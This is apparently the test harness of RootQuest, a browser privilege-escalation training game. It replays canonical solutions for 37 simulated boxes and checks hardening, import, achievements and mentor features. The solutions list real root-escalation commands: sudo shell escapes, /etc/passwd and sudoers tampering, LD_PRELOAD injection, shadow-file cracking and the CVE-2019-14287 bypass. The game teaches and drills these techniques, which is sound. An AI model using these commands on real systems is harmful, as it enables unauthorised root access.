// Logic harness: loads the real game modules in a vm sandbox and plays the
// canonical solution of each box, asserting root is obtained (plus a negative
// test that a bogus exploit does NOT grant root). Fast, browserless.
//   node tests/harness.js            # runs against the repo it lives in
//   RQLANG=fr node tests/harness.js  # same, with the FR dictionary active
const vm = require('vm');
const fs = require('fs');
const path = require('path');

const REPO = process.argv[2] || path.resolve(__dirname, '..');
const JS = (f) => fs.readFileSync(path.join(REPO, 'js', f), 'utf8');

// ── Minimal DOM / window sandbox ────────────────────────────────────────────
const sandbox = {};
sandbox.window = sandbox;
sandbox.globalThis = sandbox;
sandbox.console = console;
sandbox.setTimeout = () => {};        // swallow the win() timer
sandbox.document = {
    getElementById: () => ({ innerHTML: '', appendChild() {}, style: {}, addEventListener() {}, focus() {} }),
    querySelectorAll: () => [],
    body: { classList: { add() {}, remove() {} } },
};
vm.createContext(sandbox);

for (const f of ['i18n.js', 'fs.js', 'levels.js', 'commands.js']) {
    vm.runInContext(JS(f), sandbox, { filename: f });
}

// ── Game shims the engine expects on window ─────────────────────────────────
let CURRENT = null;
sandbox.currentLang = process.env.RQLANG || 'en';
sandbox.updatePrompt = () => {};
sandbox.setLanguage = (l) => { sandbox.currentLang = l; };
sandbox.GAME = {
    level: () => CURRENT,
    win: () => {},
    giveHint: () => [],
    nextLevel: () => [],
    reset: () => {},
    markHardened: () => {},
};

function loadLevel(level) {
    CURRENT = level;
    sandbox.FS.load(level);
    Object.assign(sandbox.SESSION, {
        user: level.user || 'player',
        host: level.host,
        cwd: level.cwd || '/home/player',
        env: { PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
        isRoot: false, hintIndex: 0, tmpBins: {}, pendingCron: false,
        cronPayload: null, cmdCount: 0, startTime: Date.now(),
        blueTeam: false, sudoAuthed: false, nfsMount: null,
    });
    sandbox.TERM = sandbox.TERM || { history: [] };
    sandbox.TERM.history = [];
}
function play(cmds) { for (const c of cmds) { sandbox.TERM.history.push(c); sandbox.CMD.execute(c); } }

// ── Canonical solutions (mirrors tests/rootquest.spec.js) ───────────────────
const SOLUTIONS = {
    1: ['find . -exec /bin/sh -p \\;'],
    2: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh', 'wait'],
    3: ["python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"],
    4: ["echo '#!/bin/sh' > /tmp/ps", "echo '/bin/sh' >> /tmp/ps", 'chmod +x /tmp/ps', 'export PATH=/tmp:$PATH', '/usr/local/bin/status'],
    5: ["sudo vim -c ':!/bin/sh'"],
    6: ["echo 'r00t::0:0:pwned:/root:/bin/bash' >> /etc/passwd", 'su r00t'],
    7: ["sudo awk 'BEGIN{system(\"/bin/sh\")}'"],
    8: ['./pwnkit'],
    9: ['su svc', 'sudo bash'],
    10: ['docker run -v /:/mnt -it alpine chroot /mnt sh'],
    11: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'sudo LD_PRELOAD=/tmp/x.so apache2ctl'],
    12: ['cd /home/player/share', "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh", 'touch ./--checkpoint=1', "touch './--checkpoint-action=exec=sh runme.sh'", 'wait'],
    13: ['ssh -i /opt/backup/id_rsa root@localhost'],
    14: ["echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn", 'sudo bash'],
    15: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', 'echo /tmp/x.so > /etc/ld.so.preload', '/usr/bin/passwd'],
    16: ['sudo find . -exec /bin/sh \\;'],
    17: ['sudo env /bin/sh'],
    18: ["sudo python3 -c 'import os; os.system(\"/bin/sh\")'"],
    19: ['sudo less !/bin/sh'],
    20: ["echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd", 'su r00t'],
    21: ["python3 -c \"print(open('/etc/shadow').read())\"", 'john /tmp/shadow.copy', 'su root'],
    22: ["echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/libagent.so.1.c", 'gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'],
    23: ['showmount -e', 'mount -t nfs box-23:/srv/backups /mnt', 'touch /srv/backups/rootbash', 'chmod u+s /srv/backups/rootbash', '/srv/backups/rootbash'],
    24: ["sudo perl -e 'exec \"/bin/sh\";'"],
    25: ['sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\''],
    26: [
        "echo '#!/bin/sh' > /tmp/pwn.sh",
        'echo \'exec /bin/sh\' >> /tmp/pwn.sh',
        'chmod +x /tmp/pwn.sh',
        'sudo EDITOR=/tmp/pwn.sh -e /etc/motd'
    ],
    27: [
        "python3 -c \"open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\\n')\"",
        'su pwnd'
    ],
    28: ['sudo -u#-1 /bin/bash'],
    29: ['sudo systemd-run /bin/sh'],
    30: ['sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh'],
    31: ["sudo mysql -e '\\! /bin/sh'"],
    32: ['sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'],
    33: ['sudo git -p help !/bin/sh'],
    34: ['sudo nice /bin/sh'],
    35: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/monitor/healthcheck.sh', 'wait'],
    36: ['sudo zip test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"'],
    37: ['sudo rsync -e "/bin/sh -c /bin/sh" 127.0.0.1:/dev/null /dev/null'],
};

let pass = 0, fail = 0;
const LEVELS = sandbox.LEVELS;
console.log(`Loaded ${LEVELS.length} levels from ${REPO} (lang=${sandbox.currentLang})\n`);
for (const level of LEVELS) {
    const sol = SOLUTIONS[level.id];
    if (!sol) { console.log(`?? box-${String(level.id).padStart(2, '0')}: NO SOLUTION DEFINED`); fail++; continue; }
    loadLevel(level);
    play(sol);
    const ok = sandbox.SESSION.isRoot === true;
    console.log(`${ok ? 'PASS' : 'FAIL'}  box-${String(level.id).padStart(2, '0')}  ${level.title.en}`);
    ok ? pass++ : fail++;
}

// Negative test: a bogus exploit must NOT grant root on box-01
loadLevel(LEVELS[0]);
play(['echo hello', 'ls -la', 'cat /etc/passwd']);
const neg = sandbox.SESSION.isRoot === false;
console.log(`${neg ? 'PASS' : 'FAIL'}  negative (no accidental root on box-01)`);
neg ? pass++ : fail++;

// sudo -l: first call this machine shows a simulated password prompt line,
// a second call does not (mirrors sudo's cached credential ticket).
loadLevel(LEVELS[4]); // box-05, has a sudoers entry
const first = sandbox.CMD.execute('sudo -l');
const second = sandbox.CMD.execute('sudo -l');
const authOk = first.some(l => l.text.startsWith('[sudo] password for'))
    && !second.some(l => l.text.startsWith('[sudo] password for'));
console.log(`${authOk ? 'PASS' : 'FAIL'}  sudo -l password prompt (once per machine)`);
authOk ? pass++ : fail++;

// box-28: (ALL, !root) exclusion must block the literal name and uid 0, but
// still fall for the CVE-2019-14287 negative-uid / uint32-wraparound bypass.
loadLevel(LEVELS[27]); // box-28
const blockedName = sandbox.CMD.execute('sudo -u root /bin/bash');
const blockedZero = sandbox.CMD.execute('sudo -u#0 /bin/bash');
const nameOk = blockedName.some(l => /not allowed to execute/.test(l.text)) && sandbox.SESSION.isRoot === false;
const zeroOk = blockedZero.some(l => /not allowed to execute/.test(l.text)) && sandbox.SESSION.isRoot === false;
sandbox.CMD.execute('sudo -u#-1 /bin/bash');
const bypassOk = sandbox.SESSION.isRoot === true;
const negUidOk = nameOk && zeroOk && bypassOk;
console.log(`${negUidOk ? 'PASS' : 'FAIL'}  sudo negative-uid bypass (box-28: -u root and -u#0 blocked, -u#-1 roots)`);
negUidOk ? pass++ : fail++;

// Blue-team: for boxes that declare a fix, root then harden and confirm it closes.
console.log('');
for (const level of LEVELS) {
    if (!level.harden) continue;
    loadLevel(level);
    play(SOLUTIONS[level.id]);       // reach root
    sandbox.SESSION.blueTeam = true; // enter harden phase
    play([level.harden.hint.en]);    // apply the documented fix
    const ok = sandbox.CMD.checkHardened(level) === true && sandbox.SESSION.blueTeam === false;
    console.log(`${ok ? 'PASS' : 'FAIL'}  harden box-${String(level.id).padStart(2, '0')}  (${level.harden.type})`);
    ok ? pass++ : fail++;
}

// ── GAME_CUSTOM (box import/export) ─────────────────────────────────────────
// Isolated sandbox: main.js defines its own window.GAME, which would clash
// with the hand-rolled shim used above.
{
    const sandbox2 = {};
    sandbox2.window = sandbox2;
    sandbox2.globalThis = sandbox2;
    sandbox2.console = { log() {}, warn() {}, error() {} };
    sandbox2.setTimeout = () => {};
    sandbox2.addEventListener = () => {};
    const store = {};
    sandbox2.localStorage = {
        getItem: (k) => (k in store ? store[k] : null),
        setItem: (k, v) => { store[k] = String(v); },
    };
    sandbox2.document = {
        addEventListener: () => {},
        getElementById: () => null,
        querySelectorAll: () => [],
        body: { classList: { add() {}, remove() {} } },
    };
    vm.createContext(sandbox2);
    vm.runInContext(JS('levels.js'), sandbox2, { filename: 'levels.js' });
    vm.runInContext(JS('main.js'), sandbox2, { filename: 'main.js' });

    const GC = sandbox2.GAME_CUSTOM;
    const startLen = sandbox2.LEVELS.length;

    const bad = GC.import(JSON.stringify({ codename: 'x' }));
    const t1 = bad.ok === false && bad.errors.length > 0;

    const validBox = {
        codename: 'custom-01',
        title: 'Custom · Test Box',
        user: 'player', host: 'custom-01', cwd: '/home/player',
        fs: { '/': { type: 'dir', owner: 'root', mode: '755', children: [] } },
        wins: [{ type: 'custom_win' }],
        flag: 'flag{custom_test}',
    };
    const good = GC.import(JSON.stringify(validBox));
    const t2 = good.ok === true
        && sandbox2.LEVELS.length === startLen + 1
        && sandbox2.MACHINE_META.length === sandbox2.LEVELS.length
        && sandbox2.LEVELS[sandbox2.LEVELS.length - 1].custom === true;
    const t3 = good.ok && good.level.title.en === 'Custom · Test Box' && good.level.title.fr === 'Custom · Test Box';

    const exported = GC.exportJSON(sandbox2.LEVELS.length - 1);
    const reparsed = exported && JSON.parse(exported);
    const t4 = !!reparsed && reparsed.codename === 'custom-01' && reparsed.id === undefined && reparsed.custom === undefined;

    const persisted = JSON.parse(store[GC.STORE_KEY] || '[]');
    const t5 = persisted.length === 1 && persisted[0].codename === 'custom-01';

    // Share link: export the just-imported box as a URL, then re-import it
    // from the hash (as a fresh visitor opening that link would) and check
    // the round-tripped box matches. No `location` global in this sandbox —
    // exportURL degrades to a bare "#box=..." fragment, which is exactly
    // what importFromHash consumes.
    const shareUrl = GC.exportURL(sandbox2.LEVELS.length - 1);
    const t6 = typeof shareUrl === 'string' && shareUrl.startsWith('#box=');
    const shareImport = GC.importFromHash(shareUrl);
    const t7 = !!shareImport && shareImport.ok === true
        && shareImport.level.codename === 'custom-01'
        && shareImport.level.flag === 'flag{custom_test}'
        && sandbox2.LEVELS.length === startLen + 2;
    const noHash = GC.importFromHash('') === null && GC.importFromHash('#somethingelse=1') === null;
    const badHash = GC.importFromHash('#box=%%%not-valid-at-all');
    const t8 = noHash && badHash && badHash.ok === false;

    const ok = t1 && t2 && t3 && t4 && t5 && t6 && t7 && t8;
    console.log(`${ok ? 'PASS' : 'FAIL'}  custom box import (validation + append + export + persistence)`);
    ok ? pass++ : fail++;
    console.log(`${(t6 && t7 && t8) ? 'PASS' : 'FAIL'}  custom box share link (export URL + re-import from hash)`);
    (t6 && t7 && t8) ? pass++ : fail++;
}

// ── Achievements ─────────────────────────────────────────────────────────
// Separate sandbox, untouched by the custom-box tests above, so LEVELS.length
// is exactly the base machine count and the "halfway" math below is exact.
{
    const sandbox3 = {};
    sandbox3.window = sandbox3;
    sandbox3.globalThis = sandbox3;
    sandbox3.console = { log() {}, warn() {}, error() {} };
    sandbox3.setTimeout = () => {};
    sandbox3.addEventListener = () => {}; // beforeinstallprompt/appinstalled listeners registered at main.js load time
    sandbox3.localStorage = { getItem: () => null, setItem: () => {} };
    sandbox3.document = {
        addEventListener: () => {},
        getElementById: () => null,
        querySelectorAll: () => [],
        documentElement: { setAttribute() {}, removeAttribute() {} },
        body: { classList: { add() {}, remove() {} } },
    };
    vm.createContext(sandbox3);
    vm.runInContext(JS('i18n.js'), sandbox3, { filename: 'i18n.js' });
    vm.runInContext(JS('levels.js'), sandbox3, { filename: 'levels.js' });
    vm.runInContext(JS('main.js'), sandbox3, { filename: 'main.js' });
    vm.runInContext(JS('walkthrough.js'), sandbox3, { filename: 'walkthrough.js' });

    const G = sandbox3.GAME;
    const total = sandbox3.LEVELS.length;
    const halfwayThreshold = Math.ceil(total / 2);

    // "Halfway There" must track the *current* machine count, not a number
    // baked in when the roster was smaller — own one short of half must not
    // qualify, owning exactly half (rounded up) must.
    G.completed = Array.from({ length: halfwayThreshold - 1 }, (_, i) => i + 1);
    const notYetHalfway = G.achState().owned < halfwayThreshold && !G.updateAchievements(false).includes('halfway');
    G.completed.push(halfwayThreshold); // one more machine tips it over
    const nowHalfway = G.updateAchievements(false).includes('halfway');
    const t1 = notYetHalfway && nowHalfway;

    // First Blood fires at 1, Root Wizard only at "own literally everything".
    G.completed = [1];
    const firstBlood = G.updateAchievements(false).includes('first_blood') && !G.updateAchievements(false).includes('root_wizard');
    G.completed = Array.from({ length: total }, (_, i) => i + 1);
    const rootWizard = G.updateAchievements(false).includes('root_wizard');
    const t2 = firstBlood && rootWizard;

    const ok = t1 && t2;
    console.log(`${ok ? 'PASS' : 'FAIL'}  achievements (dynamic halfway threshold tracks current machine count)`);
    ok ? pass++ : fail++;

    // Bonus "void" theme: locked until Root Wizard (own everything) is earned.
    // Reuses the G.completed = [1] state from just above (root_wizard NOT
    // earned yet at this point) before re-earning it for the unlocked check.
    G.completed = [1];
    G.achievements = G.updateAchievements(false);
    const lockedDenies = !G.isThemeUnlocked('void');
    sandbox3.setTheme('void');
    const lockedNoOp = sandbox3.currentTheme !== 'void';
    G.completed = Array.from({ length: total }, (_, i) => i + 1);
    G.achievements = G.updateAchievements(false);
    const unlockedAllows = G.isThemeUnlocked('void');
    sandbox3.setTheme('void');
    const unlockedApplies = sandbox3.currentTheme === 'void';
    const themeOk = lockedDenies && lockedNoOp && unlockedAllows && unlockedApplies;
    console.log(`${themeOk ? 'PASS' : 'FAIL'}  void theme locked until Root Wizard, unlocks after`);
    themeOk ? pass++ : fail++;

    // Explanation-mode coverage: every built-in box must have a non-empty
    // WALKTHROUGHS entry, or the "explain" feature silently degrades to its
    // "not available" fallback for whichever box(es) got missed when new
    // content was added — as happened for box-24..27 before this test existed.
    const missing = sandbox3.LEVELS
        .filter(l => !l.custom)
        .map(l => l.id)
        .filter(id => !Array.isArray(sandbox3.WALKTHROUGHS[id]) || sandbox3.WALKTHROUGHS[id].length === 0);
    const wtOk = missing.length === 0;
    console.log(`${wtOk ? 'PASS' : 'FAIL'}  walkthrough coverage (every built-in box has an explain-mode entry)${wtOk ? '' : ' — missing: ' + missing.join(', ')}`);
    wtOk ? pass++ : fail++;

    // Daily-reminder decision logic — pure (shouldNotifyDaily never touches
    // the DOM), so it's exercised here against a stand-in `Notification`
    // rather than a real browser permission.
    G.notifyDailyEnabled = false;
    G.lastDailyNotifiedKey = null;
    G.completed = [];
    sandbox3.Notification = { permission: 'default' };
    const offByDefault = G.shouldNotifyDaily() === false;

    G.notifyDailyEnabled = true;
    sandbox3.Notification.permission = 'denied';
    const deniedBlocks = G.shouldNotifyDaily() === false;

    sandbox3.Notification.permission = 'granted';
    const grantedAllows = G.shouldNotifyDaily() === true;

    const dailyId = sandbox3.LEVELS[G.dailyChallengeIndex()].id;
    G.completed = [dailyId];
    const ownedBlocks = G.shouldNotifyDaily() === false;
    G.completed = [];

    G.lastDailyNotifiedKey = G.todayKey();
    const alreadyShownBlocks = G.shouldNotifyDaily() === false;
    G.lastDailyNotifiedKey = null;

    let fired = 0;
    sandbox3.Notification = function() { fired++; };
    sandbox3.Notification.permission = 'granted';
    const firstFire = G.fireDailyNotificationIfDue() === true && fired === 1;
    const secondFire = G.fireDailyNotificationIfDue() === false && fired === 1; // same day: no repeat

    const notifyOk = offByDefault && deniedBlocks && grantedAllows && ownedBlocks && alreadyShownBlocks && firstFire && secondFire;
    console.log(`${notifyOk ? 'PASS' : 'FAIL'}  daily reminder logic (opt-in + permission gate, owned-today skip, once-per-day fire)`);
    notifyOk ? pass++ : fail++;
}

// ── Ghost replay: gap compression (pure) + capture-on-new-best-time only ────
{
    const gsandbox = {};
    gsandbox.window = gsandbox;
    gsandbox.globalThis = gsandbox;
    gsandbox.console = console;
    vm.createContext(gsandbox);
    vm.runInContext(JS('ghost.js'), gsandbox, { filename: 'ghost.js' }); // CMD undefined here — the wrap step is a no-op, only GHOST.compressGaps is under test

    const raw = [{ cmd: 'id', dt: 300 }, { cmd: 'sudo -l', dt: 500 }, { cmd: 'wait', dt: 60300 }];
    const compressed = gsandbox.GHOST.compressGaps(raw, 1200);
    const gapsOk = compressed.length === 3
        && compressed[0].dt <= 1200
        && (compressed[1].dt - compressed[0].dt) <= 1200
        && (compressed[2].dt - compressed[1].dt) <= 1200 // the real 59.8s gap must have been capped
        && compressed.every((c, i) => c.cmd === raw[i].cmd) // command order/content untouched
        && compressed[2].dt < raw[2].dt; // genuinely shorter than the recorded run

    console.log(`${gapsOk ? 'PASS' : 'FAIL'}  ghost replay gap compression (order preserved, long pauses capped)`);
    gapsOk ? pass++ : fail++;
}
{
    const gsandbox4 = {};
    gsandbox4.window = gsandbox4;
    gsandbox4.globalThis = gsandbox4;
    gsandbox4.console = { log() {}, warn() {}, error() {} };
    gsandbox4.setTimeout = () => {};
    gsandbox4.addEventListener = () => {};
    gsandbox4.localStorage = { getItem: () => null, setItem: () => {} };
    gsandbox4.document = {
        addEventListener: () => {},
        getElementById: (id) => (id === 'winStats' ? {} : null),
        querySelectorAll: () => [],
        documentElement: { setAttribute() {}, removeAttribute() {} },
        body: { classList: { add() {}, remove() {} } },
    };
    vm.createContext(gsandbox4);
    vm.runInContext(JS('i18n.js'), gsandbox4, { filename: 'i18n.js' });
    vm.runInContext(JS('levels.js'), gsandbox4, { filename: 'levels.js' });
    vm.runInContext(JS('commands.js'), gsandbox4, { filename: 'commands.js' }); // defines SESSION
    vm.runInContext(JS('main.js'), gsandbox4, { filename: 'main.js' });
    const G4 = gsandbox4.GAME;
    G4.currentLevel = 0;
    const lvlId = gsandbox4.LEVELS[0].id;
    G4.completed = [];
    G4.bestTimes = {};
    G4.ghosts = {};

    // First run: 30s, sets a best time -> ghost should be captured.
    gsandbox4.SESSION.startTime = Date.now() - 30000;
    gsandbox4.SESSION.cmdCount = 2;
    gsandbox4.SESSION.hintIndex = 0;
    gsandbox4.SESSION.cmdLog = [{ cmd: 'id', dt: 100 }, { cmd: 'sudo -l', dt: 2000 }];
    G4.renderStats();
    const firstRunCaptured = G4.bestTimes[lvlId] > 0
        && Array.isArray(G4.ghosts[lvlId])
        && G4.ghosts[lvlId].length === 2
        && G4.ghosts[lvlId][0].cmd === 'id';

    // Second run: slower (60s) — must NOT beat the record, so the ghost from
    // the first (faster) run must be left untouched, even though this run
    // also produced a cmdLog.
    gsandbox4.SESSION.startTime = Date.now() - 60000;
    gsandbox4.SESSION.cmdLog = [{ cmd: 'ls', dt: 50 }];
    G4.renderStats();
    const slowerRunIgnored = G4.ghosts[lvlId].length === 2 && G4.ghosts[lvlId][0].cmd === 'id';

    const ghostCaptureOk = firstRunCaptured && slowerRunIgnored;
    console.log(`${ghostCaptureOk ? 'PASS' : 'FAIL'}  ghost log capture (only saved on a new best time, untouched otherwise)`);
    ghostCaptureOk ? pass++ : fail++;
}

// ── Service-worker cache version vs package.json ────────────────────────────
// Cache-first PWA: a returning visitor keeps whatever JS/CSS was cached under
// CACHE_VERSION forever, until that string itself changes — the fetch handler
// never revalidates against the network. Every past release was supposed to
// bump it alongside package.json but didn't always (v6 vs 17 package bumps by
// the time this test was written) — assert they match so "ship a code change,
// forget the cache key" fails loudly instead of quietly stranding installed
// users on old code.
{
    const pkgVersion = JSON.parse(fs.readFileSync(path.join(REPO, 'package.json'), 'utf8')).version;
    const swSrc = fs.readFileSync(path.join(REPO, 'service-worker.js'), 'utf8');
    const m = swSrc.match(/CACHE_VERSION\s*=\s*'rootquest-v([^']+)'/);
    const swVersion = m && m[1];
    const ok = swVersion === pkgVersion;
    console.log(`${ok ? 'PASS' : 'FAIL'}  service-worker CACHE_VERSION matches package.json (${swVersion} vs ${pkgVersion})`);
    ok ? pass++ : fail++;
}

// ── Mentor engine: rules fire, are rate-limited, never spoil/score ──────────
// Loaded standalone (mentor.js has no hard dependency on levels.js/main.js —
// it reads window.SESSION/GAME/MACHINE_META defensively at call time), with
// small stand-ins for CMD/TERM/SESSION so the rule engine can be driven
// deterministically without a real box.
{
    const msandbox = {};
    msandbox.window = msandbox;
    msandbox.globalThis = msandbox;
    msandbox.console = console;
    vm.createContext(msandbox);
    msandbox.currentLang = 'en';
    msandbox.CMD = {
        execute(raw) {
            const bad = /^nope/.test(raw);
            return [{ text: bad ? 'Permission denied' : 'ok', cls: bad ? 'err' : '' }];
        }
    };
    const printed = [];
    msandbox.TERM = { print: (lines) => printed.push(...lines), scrollToBottom: () => {} };
    msandbox.SESSION = { isRoot: false, blueTeam: false, cmdCount: 0 };
    msandbox.GAME = { level: () => ({}), currentLevel: 0 };
    msandbox.MACHINE_META = [{ cat: 'SUID' }];
    msandbox.MENTORMODE = { enabled: true };
    vm.runInContext(JS('mentor.js'), msandbox, { filename: 'mentor.js' });
    msandbox.MENTOR.resetForLevel();

    // Recon nudge: RECON_THRESHOLD (7) commands go by, none matching the
    // SUID recon pattern -> exactly one 'mentor'-classed line printed.
    for (let i = 1; i <= 7; i++) {
        msandbox.SESSION.cmdCount = i;
        msandbox.CMD.execute('ls -la');
    }
    const reconFired = printed.filter(l => l.cls === 'mentor').length === 1;

    // Off switch: with MENTORMODE disabled, nothing gets printed at all,
    // even past every threshold.
    printed.length = 0;
    msandbox.MENTORMODE.enabled = false;
    msandbox.MENTOR.resetForLevel();
    for (let i = 1; i <= 30; i++) {
        msandbox.SESSION.cmdCount = i;
        msandbox.CMD.execute('nope');
    }
    const silentWhenOff = printed.length === 0;

    // Error streak: three consecutive failing commands (spaced past the
    // rate-limit gate) should fire the 'errors' rule exactly once, and the
    // bug this test guards against — the streak counter resetting/never
    // incrementing because it lived behind the rate-limit gate — must not
    // resurface (validated by deliberately re-introducing that ordering and
    // confirming this assertion goes red).
    printed.length = 0;
    msandbox.MENTORMODE.enabled = true;
    msandbox.MENTOR.resetForLevel();
    msandbox.SESSION.cmdCount = 1;
    msandbox.CMD.execute('ls -la'); // clean command first, so the streak starts at 0
    for (let i = 2; i <= 4; i++) {
        msandbox.SESSION.cmdCount = i;
        msandbox.CMD.execute('nope');
    }
    const errorsFired = printed.filter(l => l.cls === 'mentor').length === 1;

    const ok = reconFired && silentWhenOff && errorsFired;
    console.log(`${ok ? 'PASS' : 'FAIL'}  mentor engine (recon nudge fires once, mode-off stays silent, 3-error streak fires once)`);
    ok ? pass++ : fail++;
}

console.log(`\n${pass}/${pass + fail} PASS`);
process.exit(fail === 0 ? 0 : 1);
